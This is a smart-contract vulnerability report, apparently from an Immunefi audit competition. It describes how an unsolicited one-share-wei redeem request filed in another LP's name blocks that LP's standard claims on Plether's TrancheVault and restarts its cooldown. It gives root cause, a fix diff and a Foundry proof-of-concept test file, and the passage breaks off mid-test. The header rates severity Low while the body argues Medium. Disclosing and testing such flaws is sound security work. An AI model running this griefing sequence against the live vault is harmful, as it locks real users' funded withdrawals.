# \#99999 [SC-Low] TrancheVault: a one-share-wei redeem request filed in another LP's name blocks that LP's standard claims on a funded redemption, and clearing it restarts the LP's one-hour cooldown

**Submitted on Nov 16th 2026 at 01:44:47 UTC by @xylz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99999
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

- `TrancheVault.requestRedeem` lets a share owner (below, the stranger) name any address as the controller of its request. The named address is not asked.
- A request for one share-wei, alone in its epoch, is refunded instead of funded. It then sits at the head of the named LP's redeem list with nothing to claim.
- `redeem`, `withdraw`, `maxRedeem` and `maxWithdraw` read only that head. For a later redemption of the LP that is funded in full, both limits return 0 and both claims revert.
- The documented way to clear the head is to reclaim it. The reclaim delivers the stranger's share to the LP and restarts the LP's one-hour cooldown on every share it still holds.
- The stranger spends one share-wei per attempt and can repeat it. It needs no role and no price condition.
- The fix for Cecuro LOW-40 was meant to stop one account from imposing a cooldown on another. That outcome is still reachable in the other direction, and the fix removed the one-call way out the LP had at the audited commit.
- Ten tests on the repository's own LP fixture, at the release Senior caps, show the main sequence on both vaults and each other step on Junior, with a control. One more test shows the way out that existed at the audited commit.

## Affected assets

`packages/perps/src/TrancheVault.sol` at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8, both the Junior and the Senior instance.

## Preconditions

- The stranger holds at least one share-wei of the vault.
- One epoch of that vault has no other redeem request. The stranger can read this from `redeemEpochs` and file one second before the cutoff (test 6).
- Nothing else: no role, no approval from the LP, no market state.

## Root cause

1. `requestRedeem(shares, controller, owner)` (`TrancheVault.sol:606-632`) checks the owner's cooldown, balance and approval. The controller may be any non-zero address, and its consent is not asked.
2. The minimum request size is waived when an owner redeems its whole balance (`TrancheVault.sol:1611-1618`). An address that holds one share-wei can therefore file a request.
3. The request is stored under the named controller and appended to that controller's list (`TrancheVault.sol:688-708`, `:1783-1797`).
4. When no other request shares the epoch, its value rounds to zero and settlement marks the epoch refundable (`HousePool.sol:960-987`). The entry stays in the list with 0 claimable shares and 1 refundable share.
5. `redeem`, `withdraw`, `maxRedeem` and `maxWithdraw` take no request id. They read the head of the controller's list (`TrancheVault.sol:998-1012`, `:1299-1311`). With the planted entry at the head they see zero.
6. A refundable head is removed with `claimRedeemRefund`. Before its epoch matures it can be removed with `cancelRedeemRequest` (`TrancheVault.sol:894-897`). Both require `receiver == controller` (`:1620-1628`). Both set `lastDepositTime[receiver] = block.timestamp` (cancel `:911`, reclaim `:943`).
7. That timestamp blocks transfers (`:325-328`) and new redeem requests (`:617-619`) for `DEPOSIT_COOLDOWN = 1 hours` (`:38`).

Any share owner's request can add an entry to a controller's list (`:703`). Only calls by the controller or its approved operator remove one (`:904`, `:941`, `:1210`). So the planted entry stays until the LP cancels or reclaims it.

### The stated rules this breaks

The limits are documented as funded claim capacity. `packages/perps/src/interfaces/IERC7575.sol:74-76` (`maxWithdraw`) and `:93-95` (`maxRedeem`) both end with the sentence "The result is funded claim capacity". With the planted entry at the head, both return 0 for a controller whose redemption is funded in full.

`packages/perps/CANONICAL_ENTRYPOINTS.md:191-192` tells LPs how they exit: "funded requests are exposed by `pendingRedeemRequest` / `claimableRedeemRequest` and claimed through ERC-4626 `redeem` or `withdraw`". With the planted entry at the head, both claims revert. None of the repository's own Markdown files (57, dependencies excluded) names `claimRedeem` or `claimRedeemRefund`; only the interface NatSpec documents them.

`packages/perps/src/interfaces/IAsyncTrancheVault.sol:12-14` states the aim of the cooldown rule: "Deposit claims and redemption cancellations/refunds require receiver == controller, including zero-share acknowledgements, so share delivery cannot impose another account's cooldown or depend on an unsolicited receiver balance". Here the LP restores its standard claims only by taking delivery of a share from a request it never made, and that delivery restarts its cooldown (tests 1, 2).

### Cecuro LOW-40 and its fix

Cecuro LOW-40 is "Controller can force a zero-balance receiver into LP cooldown" (`audits/plether-ai-audit-report-2026-10-26.pdf`, page 150; addressed). The project's comment on it reads: "A controller therefore cannot use these paths to send unsolicited shares and impose a cooldown on an unrelated empty address". The vault repeats the aim on its error (`TrancheVault.sol:185-186`): "Prevents a controller from resetting another existing holder's whole-balance cooldown with a share claim".

The fix, `receiver == controller`, is in the code I tested. It stops a controller from choosing someone else as receiver. It does not stop a share owner from choosing someone else as controller, which happens at a different code site (`TrancheVault.sol:606-632`). `packages/perps/CANONICAL_ENTRYPOINTS.md:210-212` repeats the rule for the receiver only. In that direction the LP is both controller and receiver, the check passes, and an unsolicited share still resets the LP's whole-balance cooldown.

The fix also removed the LP's one-call way out. At the audited commit 6d6622f2 a controller could send a refunded share to an address with no balance (`_requireShareReceiver`, `TrancheVault.sol:1598-1607` at that commit). I ran this on a checkout of 6d6622f2 (second test file). The LP reclaims the planted share to an empty address, its own cooldown does not restart, and the standard claim pays. At a82d4fef the LP's own address is the only destination.

Cecuro LOW-39, "Front-runner can block third-party vault share claims by dusting the receiver" (same report, page 148), was addressed by the same fix. It concerned claims to a third-party receiver; here the LP claims to itself.

### Why this is not another listed item

- Cecuro MED-24, "LP can delay other redeemers with zero-payout refund epochs" (same report, page 57; acknowledged and listed on the program page). There, dust epochs use up the pool's bounded settlement work, so later epochs are funded later. Here settlement is on time. The LP's epoch is funded in full, and `redeem` and `withdraw` revert on that funded claim (tests 1, 2).
- Cecuro LOW-43 (same report, page 156; addressed in documentation): "maxWithdraw/maxRedeem likewise report funded claim capacity for the controller". Here they return 0 while the controller has funded claim capacity (tests 1, 2).
- SC Audit Studio SC-H2, "Zero-Amount Withdraw/Redeem Can Perpetually Reset TrancheVault Cooldown and Lock Funds." (`audits/plether-pre-audit-report.pdf`, page 23; fixed). There a third party reset the LP's cooldown by calling `withdraw(0)` or `redeem(0)` for it. At a82d4fef those calls need the controller or its operator (`TrancheVault.sol:1154`, `:1175`). Here no third party calls the LP's claim functions.
- Cecuro LOW-67, "Same-window redeemer can burn a small LP's shares for no assets" (same report, page 204; acknowledged). It is what happens to the planted share in test 5, when another LP's request is in the epoch. The loser there is the dust holder. Here the dust holder is the attacker.
- Cecuro MED-29, "Small redeemers can lose funded withdrawal value to the pool and seed account" (same report, page 67; acknowledged and listed on the program page). It concerns rounding in a partially funded epoch. No epoch in the proof is partially funded.
- `packages/perps/SECURITY.md:1399` (Known Limitations): "Redemption cancellation or terminal refund still begins a new cooldown when shares return to a wallet". It describes shares that return to a wallet. The share here was the stranger's, and so was the request.
- `packages/perps/SECURITY.md:1403-1410` (Known Limitations): share claims and refunds require the controller as receiver, and a full-balance redemption bypasses the minimum size and can round to zero. Neither line says a request can be filed in another LP's name.
- `packages/perps/src/interfaces/IAsyncTrancheVault.sol:8-10`: "A rejected deposit or refundable redeem head must be cancelled or reclaimed before standard claims advance to a later request; explicit-id claim methods preserve deterministic epoch selection for integrations". I rely on its first clause. The explicit-id claim pays (tests 1, 2), but the project's documented LP exit is the standard claim (`CANONICAL_ENTRYPOINTS.md:191-192`), and a holder limited to `IERC7540` and `IERC7575` reaches it only through an operator (test 10).

I searched the four audit reports in `audits/` and the October 15 scan report there for a request filed in another controller's name, an unsolicited request, or a blocked controller list head. I found none.

## Attack path

1. In an epoch with no other redeem request, the stranger moves one share-wei to a fresh address, which calls `requestRedeem(1, LP, itself)`. The epoch settles, and the request becomes a refundable entry at the head of the LP's list.
2. The LP requests a redemption of its own in a later epoch. That epoch settles and is funded in full.
3. The LP's `redeem` and `withdraw` revert, and `maxRedeem` and `maxWithdraw` return 0. `claimableRedeemRequest` still shows the redemption as funded.
4. The LP follows the interface and calls `claimRedeemRefund` for the head. The stranger's share arrives, and the LP's remaining shares are locked for 3,600 seconds.
5. The stranger files a second request for one more share-wei, and the LP's next funded redemption is blocked again.

## Impact

The stranger gains nothing. The LP is damaged in two ways, and each is asserted in the proof.

- While the planted entry heads the LP's list, the standard claims do not work for a redemption that is funded in full (49,999.99 USDG in test 1).
- Removing the entry blocks transfers and new redeem requests for every share the LP still holds for 3,600 seconds. A transfer is refused one second before the hour ends and succeeds at 3,600 seconds.

What each response of the LP leaves, each one executed:

- Reclaim the planted entry with `claimRedeemRefund`, the documented step (tests 1, 2). The standard `redeem` then pays. The LP's remaining shares are locked for an hour.
- Cancel it with `cancelRedeemRequest` before its epoch matures (test 4). The same cooldown starts.
- Claim by request id with `claimRedeem(requestId, ...)`, which `IAsyncTrancheVault` declares and `IERC7540` does not (tests 1, 2). It pays the funded assets in full. The planted entry is still the head afterwards, and both limits still return 0 for that address.
- Move the rest of the position to a second address, then reclaim (tests 1, 2). The moved shares are not locked. The LP must act before it clears its own list, and the stranger can plant again at the new address.
- Keep the shares at one address and always name another as controller (test 8). The cooldown lands on the controller address. That controller's standard claims are still blocked until it reclaims each entry.
- Name a controller address that has never been used (test 9). The standard claims work for that one redemption.
- A controller that is a contract and calls only `IERC7540` and `IERC7575` functions has none of these (test 10). Its redemption shows as funded, `maxRedeem` stays 0 over three further epochs, and its claim reverts. It is paid only after it approves an operator; in the test the operator claims by request id.

Two cases limit the stranger. If another LP's request is already in the epoch, the planted entry is funded for zero assets (test 5). Then `maxWithdraw` is 0 and `withdraw` reverts, while `redeem(1)` clears the entry with no cooldown. If the LP's own request is in the epoch, the share merges into it and nothing is blocked (test 7). The stranger files one second before the cutoff of an epoch it reads as empty. Only a request in that last second can share it, and a request at the cutoff goes to the next epoch (test 6).

## Severity

Medium. The program's row is "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)". The attacker has no profit. The damage is the two effects above, at a cost of one share-wei per attempt, against any LP address of either vault.

## Recommended fix

Either of the first two is enough. The first lets the standard claims reach the funded request, so the LP does not have to remove the entry. The second prevents the entry. The third removes only the cooldown, and the LP would still need one reclaim before its standard claims work.

- Let the standard claims and the `max*` views pass over a head entry that has no claimable assets.
- Require the controller's consent when `controller != owner` in `requestRedeem`, as in the diff below.
- Do not restart the cooldown when the shares returned by a cancellation or refund were not supplied by the controller.

```diff
--- a/packages/perps/src/TrancheVault.sol
+++ b/packages/perps/src/TrancheVault.sol
@@ -614,6 +614,9 @@ contract TrancheVault is ERC4626, IAsyncTrancheVaultClaimableRedeem {
         if (shares == 0) {
             revert TrancheVault__WithdrawalTooSmall();
         }
+        if (controller != owner && !isOperator[controller][owner]) {
+            revert TrancheVault__NotControllerOrOperator();
+        }
         if (block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) {
             revert TrancheVault__DepositCooldown();
         }
```

I ran file 1 on a copy of a82d4fef with this diff applied, with the repository's compiler configuration. Nine tests fail with `TrancheVault__NotControllerOrOperator`, and the control passes. In seven the stranger's request reverts. In tests 8 and 9 the LP's own request, which names its second or third address as controller, reverts first. Under this fix such an LP must first approve the owning address as operator on its controller address.


## Proof of Concept

Two Foundry test files on the repository's own LP fixture (`HousePoolAsyncTestBase`, the base of the project's `TrancheShareReceiver.t.sol`). The first adds one small contract, the holder of test 10. No in-scope contract is modified. The results rest on compile-time constants (the one-hour cooldown, the epoch length).

Every test of file 1 first sets the release Senior caps, 40,000,000 USDG and 8,000 bps (`packages/perps/DEPLOYMENT.md:154-155`), through the fixture's own `_setSeniorCapacity`. The fixture still differs from the release table (`packages/perps/DEPLOYMENT.md:123`, "Initial release parameters") in six rows. The tests open no position, so the first five have no effect:

- `vpiFactor` is 0 (release `0.01e18`);
- `maintMarginBps` is 100 (release 10);
- `initMarginBps` is 150 (release 20);
- `adverseConfidenceMultiplierBps` is 2,000 (release 2,500);
- `minOpenNotionalAssets` is 100 USDG (release 1,000 USDG);
- the Senior / Junior seed is 1,000 USDG each (release 1 USDG each), which leaves the share price unchanged.

File 1, at a82d4fef. Place it at `packages/perps/test/perps/poc/UnsolicitedRedeemRequest.t.sol` and run from `packages/perps`:

`forge test --match-path test/perps/poc/UnsolicitedRedeemRequest.t.sol -vv`

Ten tests pass:

1. `test_Junior_UnsolicitedRequestHidesAFundedRedemption`. The LP deposits 100,000 USDG into Junior. The stranger moves one share-wei to a fresh address, which calls `requestRedeem(1, LP, itself)`. The epoch settles. The LP redeems half, and its epoch settles and is funded in full.
   - Logged and asserted: the funded amount, `maxRedeem == 0`, `maxWithdraw == 0`; the head of the LP's list is the planted entry; `redeem` and `withdraw` for the funded amounts revert with `ERC4626ExceededMaxRedeem` and `ERC4626ExceededMaxWithdraw`.
   - Then each response from that same state. The claim by id pays and leaves the head and both limits unchanged. Moving the position first avoids the lock. The reclaim restarts the cooldown (3,600 seconds left, logged), and transfer and `requestRedeem` revert until one hour has passed.
   - Then the stranger files a second request, and the LP's next funded redemption is blocked again.
2. `test_Senior_UnsolicitedRequestHidesAFundedRedemption`. The same sequence on the Senior vault.
3. `test_Control_WithoutTheUnsolicitedRequest`. The same world without the stranger's request. The logged limits equal the funded amounts, the standard `redeem` pays, a transfer and a new redeem request succeed, and the cooldown timestamp does not change.
4. `test_CancellingTheUnsolicitedRequestRestartsTheCooldownToo`.
5. `test_FundedEpochVariant_WithdrawPathIsBlocked_RedeemOfOneShareClears`.
6. `test_StrangerFilesJustBeforeTheCutoffOfAnEmptyEpoch`.
7. `test_LpsOwnRequestInTheSameEpochAbsorbsTheShare`.
8. `test_StandingControllerSplit_KeepsTheCooldownOffTheShares`.
9. `test_FreshControllerPerRedemption_KeepsTheStandardClaims`.
10. `test_StandardOnlyHolder_CannotClaimUntilAnOperatorDoesItByRequestId`.

File 2, at the audited commit 6d6622f2 only. Place it at `packages/perps/test/perps/poc/UnsolicitedRedeemRequestAtAuditedCommit.t.sol` in a checkout of that commit and run it the same way. One test passes: `test_AtTheAuditedCommit_TheLpCouldSendTheShareToAnEmptyAddress`.

Excerpt of both runs with the repository's own compiler configuration (gas figures and compiler output removed):

```
File 1, commit a82d4fef:
[PASS] test_CancellingTheUnsolicitedRequestRestartsTheCooldownToo()
[PASS] test_Control_WithoutTheUnsolicitedRequest()
  LP's request: funded USDG (6 decimals): 49999998347
  maxRedeem(LP): 50000489904795
  maxWithdraw(LP): 49999998347
[PASS] test_FreshControllerPerRedemption_KeepsTheStandardClaims()
[PASS] test_FundedEpochVariant_WithdrawPathIsBlocked_RedeemOfOneShareClears()
[PASS] test_Junior_UnsolicitedRequestHidesAFundedRedemption()
  LP's request: funded USDG (6 decimals): 49999997936
  LP's request: claimableRedeemRequest (shares): 50000489904795
  maxRedeem(LP): 0
  maxWithdraw(LP): 0
  seconds of cooldown left after the reclaim: 3600
[PASS] test_LpsOwnRequestInTheSameEpochAbsorbsTheShare()
[PASS] test_Senior_UnsolicitedRequestHidesAFundedRedemption()
  LP's request: funded USDG (6 decimals): 50002283141
  LP's request: claimableRedeemRequest (shares): 49966232620164
  maxRedeem(LP): 0
  maxWithdraw(LP): 0
  seconds of cooldown left after the reclaim: 3600
[PASS] test_StandardOnlyHolder_CannotClaimUntilAnOperatorDoesItByRequestId()
[PASS] test_StandingControllerSplit_KeepsTheCooldownOffTheShares()
[PASS] test_StrangerFilesJustBeforeTheCutoffOfAnEmptyEpoch()
Suite result: ok. 10 passed; 0 failed; 0 skipped

File 2, commit 6d6622f2:
[PASS] test_AtTheAuditedCommit_TheLpCouldSendTheShareToAnEmptyAddress()
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The full files follow.

`packages/perps/test/perps/poc/UnsolicitedRedeemRequest.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// @notice A holder that uses only functions of IERC7540 and IERC7575: it requests a redemption for itself, claims
///         with `redeem(maxRedeem(...))`, and can approve an operator. It models an integration that was written
///         against the two standard interfaces.
contract StandardOnlyHolder {

    TrancheVault internal immutable VAULT;

    constructor(
        TrancheVault vault
    ) {
        VAULT = vault;
    }

    function requestExit(
        uint256 shares
    ) external returns (uint256 requestId) {
        return VAULT.requestRedeem(shares, address(this), address(this));
    }

    function claimAll(
        address receiver
    ) external returns (uint256 assets) {
        return VAULT.redeem(VAULT.maxRedeem(address(this)), receiver, address(this));
    }

    function approveOperator(
        address operator
    ) external {
        VAULT.setOperator(operator, true);
    }

}

/// @notice Proof of concept on the repository's own LP fixture (the base of test/perps/spec/lp/TrancheShareReceiver.t.sol).
///         Place this file at packages/perps/test/perps/poc/UnsolicitedRedeemRequest.t.sol and run
///         `forge test --match-path test/perps/poc/UnsolicitedRedeemRequest.t.sol -vv` from packages/perps.
///
///         Any share holder can file a one-share-wei redeem request that names another LP as controller
///         (`requestRedeem(shares, controller, owner)`). When that request is alone in its epoch it becomes a
///         refundable entry at the head of the LP's redeem list. The ERC-7540 claims and limits read only that head,
///         so the LP's later, fully funded redemption is reported as zero and cannot be claimed through them. A
///         refundable head is removed by reclaiming it, and the entry can be cancelled before its epoch matures. Both
///         deliver the stranger's share to the LP and restart the one-hour cooldown on the LP's whole balance.
contract UnsolicitedRedeemRequestPoC is HousePoolAsyncTestBase {

    address internal constant VICTIM_LP = address(0xA11CE); // the LP
    address internal constant VICTIM_LP_SECOND = address(0xA11CE2); // a second address of the LP
    address internal constant VICTIM_LP_THIRD = address(0xA11CE3); // a third address of the LP, never used before
    address internal constant STRANGER = address(0xBAD); // any other share holder
    address internal constant OTHER_LP = address(0xCA401); // a third LP
    address internal constant OPERATOR = address(0x0F3A4702);
    address internal constant FRESH_1 = address(0xF001); // fresh holders of one share-wei
    address internal constant FRESH_2 = address(0xF002);

    bytes4 internal constant TRANSFER_COOLDOWN = TrancheVault.TrancheVault__TransferDuringCooldown.selector;
    bytes4 internal constant REQUEST_COOLDOWN = TrancheVault.TrancheVault__DepositCooldown.selector;

    function _maxRedeemError(
        address controller,
        uint256 shares,
        uint256 max
    ) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("ERC4626ExceededMaxRedeem(address,uint256,uint256)", controller, shares, max);
    }

    function _maxWithdrawError(
        uint256 assets,
        uint256 max
    ) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("ERC4626ExceededMaxWithdraw(address,uint256,uint256)", VICTIM_LP, assets, max);
    }

    function _lps(
        TrancheVault vault
    ) internal {
        // The release Senior caps (packages/perps/DEPLOYMENT.md: 40,000,000 USDG and 8,000 bps), through the
        // fixture's own proposePoolConfig / finalizePoolConfig helper.
        _setSeniorCapacity(40_000_000e6, 8_000);
        _fundTrancheAsync(vault, VICTIM_LP, 100_000e6);
        _fundTrancheAsync(vault, STRANGER, 100e6);
        _fundTrancheAsync(vault, OTHER_LP, 10_000e6);
        _finishAsyncCooldown(vault, VICTIM_LP);
        _finishAsyncCooldown(vault, STRANGER);
        _finishAsyncCooldown(vault, OTHER_LP);
    }

    /// The stranger's whole action: move one share-wei to a fresh address, which requests its redemption with the
    /// named account as controller. The minimum request size does not apply to a holder's whole balance.
    function _plantOn(
        TrancheVault vault,
        address fresh,
        address controller
    ) internal returns (uint256 requestId) {
        vm.prank(STRANGER);
        vault.transfer(fresh, 1);
        vm.prank(fresh);
        requestId = vault.requestRedeem(1, controller, fresh);
    }

    function _plant(
        TrancheVault vault,
        address fresh
    ) internal returns (uint256 requestId) {
        return _plantOn(vault, fresh, VICTIM_LP);
    }

    /// The LP exits with half of its shares and the epoch is funded in full.
    function _lpExitsHalf(
        TrancheVault vault,
        uint256 atLeastAssets
    ) internal returns (uint256 requestId, uint256 shares, uint256 assets) {
        uint256 half = vault.balanceOf(VICTIM_LP) / 2;
        requestId = _requestAsyncRedeem(vault, VICTIM_LP, half);
        _settleAsyncRequest(requestId, true);
        shares = vault.claimableRedeemRequest(requestId, VICTIM_LP);
        assets = vault.claimableRedeemAssets(requestId, VICTIM_LP);
        assertEq(shares, half, "the LP's redemption is funded in full");
        assertGt(assets, atLeastAssets, "the LP's USDG is waiting in claim escrow");
    }

    function _scenario(
        TrancheVault vault
    ) internal {
        _lps(vault);

        uint256 plantId = _plant(vault, FRESH_1);
        _settleAsyncRequest(plantId, true);
        assertEq(vault.claimableRedeemRequest(plantId, VICTIM_LP), 0, "the planted entry has nothing claimable");
        assertEq(vault.refundableRedeemRequest(plantId, VICTIM_LP), 1, "it holds one refundable share-wei");

        (uint256 lpRequestId, uint256 shares, uint256 assets) = _lpExitsHalf(vault, 49_000e6);
        emit log_named_uint("LP's request: funded USDG (6 decimals)", assets);
        emit log_named_uint("LP's request: claimableRedeemRequest (shares)", shares);
        emit log_named_uint("maxRedeem(LP)", vault.maxRedeem(VICTIM_LP));
        emit log_named_uint("maxWithdraw(LP)", vault.maxWithdraw(VICTIM_LP));

        // 1. The standard surface reports nothing and pays nothing, although the LP's assets are funded.
        assertEq(vault.controllerRedeemHead(VICTIM_LP), plantId);
        assertEq(vault.maxRedeem(VICTIM_LP), 0);
        assertEq(vault.maxWithdraw(VICTIM_LP), 0);
        vm.startPrank(VICTIM_LP);
        vm.expectRevert(_maxRedeemError(VICTIM_LP, shares, 0));
        vault.redeem(shares, VICTIM_LP, VICTIM_LP);
        vm.expectRevert(_maxWithdrawError(assets, 0));
        vault.withdraw(assets, VICTIM_LP, VICTIM_LP);
        vm.expectRevert(_maxRedeemError(VICTIM_LP, 1, 0));
        vault.redeem(1, VICTIM_LP, VICTIM_LP);
        vm.stopPrank();

        // 2. What still pays: the claim by request id, which is outside ERC-7540. It leaves the list as it was.
        uint256 snapshot = vm.snapshotState();
        vm.prank(VICTIM_LP);
        assertEq(vault.claimRedeem(lpRequestId, shares, VICTIM_LP, VICTIM_LP), assets);
        assertEq(vault.controllerRedeemHead(VICTIM_LP), plantId, "the planted entry is still the head");
        assertEq(vault.maxRedeem(VICTIM_LP), 0);
        assertEq(vault.maxWithdraw(VICTIM_LP), 0);
        vm.revertToState(snapshot);

        // 3. What avoids the cooldown: moving the position first. The LP moves the rest of its position to a second
        //    address before reclaiming, so the restarted cooldown binds an address that holds only the stranger's share.
        snapshot = vm.snapshotState();
        uint256 rest = vault.balanceOf(VICTIM_LP);
        vm.startPrank(VICTIM_LP);
        vault.transfer(VICTIM_LP_SECOND, rest);
        vault.claimRedeemRefund(plantId, VICTIM_LP, VICTIM_LP);
        assertEq(vault.redeem(shares, VICTIM_LP, VICTIM_LP), assets);
        vm.stopPrank();
        _requestAsyncRedeem(vault, VICTIM_LP_SECOND, rest / 2);
        vm.revertToState(snapshot);

        // 4. The documented step for a refundable head: reclaim it. The stranger's share arrives and restarts the
        //    cooldown on everything the LP still holds.
        uint256 reclaimedAt = vm.getBlockTimestamp();
        assertLe(vault.lastDepositTime(VICTIM_LP) + vault.DEPOSIT_COOLDOWN(), reclaimedAt, "no cooldown is running");
        vm.startPrank(VICTIM_LP);
        assertEq(vault.claimRedeemRefund(plantId, VICTIM_LP, VICTIM_LP), 1);
        assertEq(vault.lastDepositTime(VICTIM_LP), reclaimedAt, "the cooldown restarted");
        emit log_named_uint("seconds of cooldown left after the reclaim",
            vault.lastDepositTime(VICTIM_LP) + vault.DEPOSIT_COOLDOWN() - reclaimedAt);
        assertEq(vault.redeem(shares, VICTIM_LP, VICTIM_LP), assets, "the standard claim works again");
        uint256 left = vault.balanceOf(VICTIM_LP);
        vm.expectRevert(TRANSFER_COOLDOWN);
        vault.transfer(VICTIM_LP_SECOND, left);
        vm.expectRevert(REQUEST_COOLDOWN);
        vault.requestRedeem(left / 2, VICTIM_LP, VICTIM_LP);
        vm.warp(reclaimedAt + 1 hours - 1);
        vm.expectRevert(TRANSFER_COOLDOWN);
        vault.transfer(VICTIM_LP_SECOND, left);
        vm.expectRevert(REQUEST_COOLDOWN);
        vault.requestRedeem(left / 2, VICTIM_LP, VICTIM_LP);
        vm.warp(reclaimedAt + 1 hours);
        vault.transfer(VICTIM_LP_SECOND, 1); // free again after exactly one hour
        vm.stopPrank();

        // 5. The stranger repeats it for one more share-wei, and the LP's next funded redemption is hidden again.
        uint256 plant2 = _plant(vault, FRESH_2);
        _settleAsyncRequest(plant2, true);
        assertEq(vault.refundableRedeemRequest(plant2, VICTIM_LP), 1);
        (, uint256 shares2,) = _lpExitsHalf(vault, 24_000e6);
        assertEq(vault.controllerRedeemHead(VICTIM_LP), plant2);
        assertEq(vault.maxRedeem(VICTIM_LP), 0);
        vm.expectRevert(_maxRedeemError(VICTIM_LP, shares2, 0));
        vm.prank(VICTIM_LP);
        vault.redeem(shares2, VICTIM_LP, VICTIM_LP);
    }

    function test_Junior_UnsolicitedRequestHidesAFundedRedemption() public {
        _scenario(juniorVault);
    }

    function test_Senior_UnsolicitedRequestHidesAFundedRedemption() public {
        _scenario(seniorVault);
    }

    /// Control: the same world without the stranger's request.
    function test_Control_WithoutTheUnsolicitedRequest() public {
        _lps(juniorVault);
        (uint256 lpRequestId, uint256 shares, uint256 assets) = _lpExitsHalf(juniorVault, 49_000e6);
        emit log_named_uint("LP's request: funded USDG (6 decimals)", assets);
        emit log_named_uint("maxRedeem(LP)", juniorVault.maxRedeem(VICTIM_LP));
        emit log_named_uint("maxWithdraw(LP)", juniorVault.maxWithdraw(VICTIM_LP));
        assertEq(juniorVault.controllerRedeemHead(VICTIM_LP), lpRequestId);
        assertEq(juniorVault.maxRedeem(VICTIM_LP), shares);
        assertEq(juniorVault.maxWithdraw(VICTIM_LP), assets);
        uint256 cooldownBefore = juniorVault.lastDepositTime(VICTIM_LP);
        vm.startPrank(VICTIM_LP);
        assertEq(juniorVault.redeem(shares, VICTIM_LP, VICTIM_LP), assets);
        uint256 left = juniorVault.balanceOf(VICTIM_LP);
        juniorVault.transfer(VICTIM_LP_SECOND, left / 4);
        juniorVault.requestRedeem(left / 4, VICTIM_LP, VICTIM_LP);
        vm.stopPrank();
        assertEq(juniorVault.lastDepositTime(VICTIM_LP), cooldownBefore);
    }

    /// Cancelling the entry before its epoch matures restarts the cooldown as well.
    function test_CancellingTheUnsolicitedRequestRestartsTheCooldownToo() public {
        _lps(juniorVault);
        uint256 plantId = _plant(juniorVault, FRESH_1);
        assertEq(juniorVault.controllerRedeemHead(VICTIM_LP), plantId);
        uint256 cancelledAt = vm.getBlockTimestamp();
        uint256 balance = juniorVault.balanceOf(VICTIM_LP);
        vm.startPrank(VICTIM_LP);
        assertEq(juniorVault.cancelRedeemRequest(plantId, VICTIM_LP, VICTIM_LP), 1);
        assertEq(juniorVault.lastDepositTime(VICTIM_LP), cancelledAt);
        vm.expectRevert(TRANSFER_COOLDOWN);
        juniorVault.transfer(VICTIM_LP_SECOND, balance);
        vm.expectRevert(REQUEST_COOLDOWN);
        juniorVault.requestRedeem(balance / 2, VICTIM_LP, VICTIM_LP);
        vm.warp(cancelledAt + 1 hours - 1);
        vm.expectRevert(TRANSFER_COOLDOWN);
        juniorVault.transfer(VICTIM_LP_SECOND, balance);
        vm.expectRevert(REQUEST_COOLDOWN);
        juniorVault.requestRedeem(balance / 2, VICTIM_LP, VICTIM_LP);
        vm.warp(cancelledAt + 1 hours);
        juniorVault.transfer(VICTIM_LP_SECOND, 1);
        juniorVault.requestRedeem(balance / 2, VICTIM_LP, VICTIM_LP);
        vm.stopPrank();
    }

    /// When an epoch has no other redeem request, the stranger can keep it that way: requests stop joining an epoch
    /// at its cutoff (`getRequestEpochWindow`), so a request filed one second before the cutoff stays alone, and a
    /// request that arrives at the cutoff goes to the next epoch.
    function test_StrangerFilesJustBeforeTheCutoffOfAnEmptyEpoch() public {
        _lps(juniorVault);
        (uint256 epoch, uint256 cutoff) = juniorVault.getRequestEpochWindow();

        vm.warp(cutoff - 1);
        uint256 plantId = _plant(juniorVault, FRESH_1);
        assertEq(plantId, epoch);
        vm.warp(cutoff);
        uint256 otherLpRequestId = _requestAsyncRedeem(juniorVault, OTHER_LP, juniorVault.balanceOf(OTHER_LP) / 2);
        assertEq(otherLpRequestId, epoch + 1, "a request at the cutoff goes to the next epoch");

        _settleAsyncRequest(plantId, true);
        assertEq(juniorVault.refundableRedeemRequest(plantId, VICTIM_LP), 1, "the planted entry stayed alone");
        assertEq(juniorVault.controllerRedeemHead(VICTIM_LP), plantId);
    }

    /// When another LP redeems in the same epoch the planted entry is funded for zero assets. `maxWithdraw` is zero
    /// and `withdraw` reverts for both amounts tried; `redeem(maxRedeem)` burns the stranger's share for nothing and
    /// clears it.
    function test_FundedEpochVariant_WithdrawPathIsBlocked_RedeemOfOneShareClears() public {
        _lps(juniorVault);
        uint256 plantId = _plant(juniorVault, FRESH_1);
        uint256 otherLpShares = juniorVault.balanceOf(OTHER_LP) / 2;
        assertEq(_requestAsyncRedeem(juniorVault, OTHER_LP, otherLpShares), plantId, "same epoch");
        _settleAsyncRequest(plantId, true);
        assertEq(juniorVault.claimableRedeemRequest(plantId, VICTIM_LP), 1);
        assertEq(juniorVault.claimableRedeemAssets(plantId, VICTIM_LP), 0);

        (uint256 lpRequestId, uint256 shares, uint256 assets) = _lpExitsHalf(juniorVault, 49_000e6);
        assertEq(juniorVault.maxRedeem(VICTIM_LP), 1);
        assertEq(juniorVault.maxWithdraw(VICTIM_LP), 0);
        uint256 cooldownBefore = juniorVault.lastDepositTime(VICTIM_LP);
        vm.startPrank(VICTIM_LP);
        vm.expectRevert(_maxWithdrawError(assets, 0));
        juniorVault.withdraw(assets, VICTIM_LP, VICTIM_LP);
        vm.expectRevert(_maxWithdrawError(1, 0));
        juniorVault.withdraw(1, VICTIM_LP, VICTIM_LP);
        vm.expectRevert(_maxRedeemError(VICTIM_LP, shares, 1));
        juniorVault.redeem(shares, VICTIM_LP, VICTIM_LP);
        assertEq(juniorVault.redeem(1, VICTIM_LP, VICTIM_LP), 0);
        assertEq(juniorVault.controllerRedeemHead(VICTIM_LP), lpRequestId);
